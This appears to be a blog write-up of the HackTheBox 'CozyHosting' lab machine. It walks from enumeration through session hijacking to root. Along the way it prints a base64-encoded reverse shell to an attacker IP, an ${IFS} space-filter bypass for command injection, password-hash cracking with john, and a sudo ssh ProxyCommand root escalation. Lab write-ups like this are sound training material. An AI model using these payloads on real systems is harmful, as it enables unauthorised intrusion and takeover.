HackTheBox write up: “CozyHosting” Machine
==========================================

[![zerosandones](https://miro.medium.com/v2/resize:fill:88:88/1*8PgWCWtteykN7zPXDqImEQ.jpeg)

](https://medium.com/@ahmedgomaa_45441?source=post_page-----8b55beb59ace--------------------------------)

[zerosandones](https://medium.com/@ahmedgomaa_45441?source=post_page-----8b55beb59ace--------------------------------)

·

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fa3f1b2b68ccf&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40ahmedgomaa_45441%2Fhackthebox-write-up-cozyhosting-machine-8b55beb59ace&user=zerosandones&userId=a3f1b2b68ccf&source=post_page-a3f1b2b68ccf----8b55beb59ace---------------------post_header-----------)

5 min read·Just now

\--

Listen

Share

![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/879cc2ee-bedc-448e-8f5a-1fdc65ee1e8c)


Welcome To HACKTHEBOX:CozyHosting machine writeup. It is an easy machine with a focus on web application vulnerabilities and privilage escalation vulnerabilities.

we first start by running a basic nmap scan against the machine ip

```
nmap -sV -sC 10.10.11.230 
```

We are using -sV and -sC here for probing the open ports and trying to get info about the version running by running it against default nmap scripts.

![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/c3c02c60-5f67-4549-b72e-d91dec6843fe)


We can see here that we have port 22 and 80 open, which indicates the existance of web application running on port 80, and SSH service running on port 22, lets take a look at the web application
![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/5f3096be-c5ba-4ede-a450-7b96c86c73e0)


Web application

we can observe a web application with a login functionailty, we can visit and try testing for SQL Injection in the login page, but without success.

next step is to enumerate the web application for any hidden directories, we can use different tools, i personally prefer Dirsearch.
![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/df171dce-4bed-4cf0-9c99-c1a235303f92)


we found few intresting directories, by visiting them, we can find valuable information in the /actuator/sessions directory, as it contains session cookies for the users
![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/eed4db23-58ae-4ba5-84fc-735bcbbb12f0)


And by trying to visit the /admin panel, and intercepting the requesting, modifying the session cookie and replacing it with the one we got from /actuator/sessions, we find that we get redirected to the admin dashboard with the admin “kanderson” logged in.

After a quick inspection to the dashboard we find that there is a feature to add a new host to the automatic patching.
![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/480cc798-d6b1-4544-8ea1-807df7c4e3f6)


After trying to submit data through it, and analyzing the requests in the burpsuite proxy, we find that the submit button calls and endpoint /excutessh
![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/39720675-c0e6-4e09-8fdf-b0e9854b87d2)


after poking with it alittle, we find that submitting single quote returns the following error:

```
http://cozyhosting.htb/admin?error=/bin/bash: -c: line 1: unexpected EOF while looking for matching \`''/bin/bash: -c: line 2: syntax error: unexpected end of file
```
![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/687529cc-c0f0-4827-ad2c-545c139697ea)


which allows for the possibilty of command injection, lets try using our payload

```
echo "bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1" | base64 -w 0
```

we are going to base64 encode our payload that that we dont have to use spaces in the payload, as the application filters it out

```
;echo${IFS%??}"<your payload here>"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
```

`${IFS%??}` Explanation:

*   `${IFS}`: This is a special shell variable in Unix-like operating systems that stands for "Internal Field Separator." By default, it is set to a space, tab, and newline characters. It's used by the shell to split lines into fields when processing commands.
*   `${IFS%??}`: This is a string manipulation construct in the shell. It trims the last two characters from the `${IFS}` variable. So, if `${IFS}` is set to the default value (space, tab, newline), `${IFS%??}` effectively removes the last two characters (newline and tab) and leaves only the space character, which is required for the payload to run correctly.

Additionally, as the web application may interpret the special characters differently or sanitize them to prevent malicious commands from being executed, we URLEncode our payload.

we start a listener and submit our payload, and we get a reverse connection

![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/0894c592-d909-4ca0-96c2-2e03d064644f)

![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/26b6cfd2-e020-4d48-9666-3c57a00fdebf)

Upon listing looking for files, we find a directory named josh in the /home directory, but we cant access it, we can also see a .jar file in the /app, we download this file into our machine for futher inspection.

we can download it by running a python http.server and then using wget from our machine to download the file.
![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/563a5ea9-f256-4642-bfc8-a0bf72b5e5e7)

![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/b118bb7c-6327-4de8-b946-e1bb25a7459d)



we can start inspecting this file using tool like jd-gui
![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/906a8cca-c720-4475-808b-837b5534946f)


after inspecting we can find that it contains postgres database credentials like the username and the password, so we try to login in to the postgres database using the commnads:

```
psql -h 127.0.0.1 -U postgres
``````
\\c cozyhosting
``````
\\d #to list availabe databases
```
![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/c7d07dc7-f747-413d-b30a-b5511df006b4)

```

select \* from users; #To select all data in the users database

```
![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/2032451d-df9e-4898-8a5a-75523888c34c)

the passwords is hashed, we can try to crack it using john the ripper, with the following command, pointing to the wordlist to use ( in this case rockyou.txt will be sufficient )

```
john hash.txt --wordlist=/home/zeronull/rockyou.txt
```
![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/d0966515-7398-4b64-a993-8df4d8349f9b)

now we can try to use this password to ssh into the machine using the user josh

```
ssh josh@10.10.11.230 
```

And we succesfully log in with the user josh, and we can access his directory, and access the user flag.txt

![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/7086d8bb-afe1-44c8-88a7-edaffc56b70f)


Privilege Escalation
====================

As for the root flag, we need to do Privilege Escalation in order to access the root directory.

we start by checking the allowed commands for our user to run as root without the passowrd, we check by running sudo -l
![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/42fe3acc-e0e8-49aa-b3f5-7181f9e65855)


we see that we can run (root) /usr/bin/ssh \* as root without having to have the root password, lets check the GTFObins if we can abuse this to escalate our privileges to root.

we find:

![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/35470ea6-3de5-4d88-a001-c83bcd1a66df)

and by running

```
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

we get our root access successfully.

![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/f68ef66e-4fff-438f-ad98-8a7c34087c83)


and thats how we get our root flag.
